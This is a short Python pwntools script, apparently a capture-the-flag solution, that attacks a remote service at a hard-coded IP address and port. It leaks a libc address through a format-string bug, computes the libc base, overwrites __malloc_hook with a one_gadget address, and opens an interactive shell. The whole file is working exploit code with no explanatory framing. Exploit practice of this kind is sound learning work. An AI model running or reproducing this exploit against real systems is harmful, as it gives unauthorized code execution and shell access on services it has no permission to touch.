#!/usr/bin/python2
from pwn import *
context.arch = 'amd64'
# p = process('./format')
p = remote('64.227.39.89',32050)
binary = ELF('libc6_2.27-3ubuntu1.2_amd64.so',checksec=False)

binary.symbols['one_gadget'] = 0x4f322
def leak(s, newline=True):
    p.sendline(s)
    if(newline):
        return p.recvline()[:-1]
    else:
        return p.recv()

# def pie_pass():
#     p.sendline('%32$p')
#     pie = int(p.recvline(),16)
#     elf.address = pie - 0x12d0

libc_leak = int(leak('%45$p'),16)
print(hex(libc_leak))
binary.address = libc_leak - 0x021b97
binary.symbols['__libc_start_main']
print(hex(binary.address))

payload = fmtstr_payload(6, {binary.symbols['__malloc_hook']:binary.symbols['one_gadget']})

p.sendline(payload)
# p.sendline(b'%65535')
p.interactive()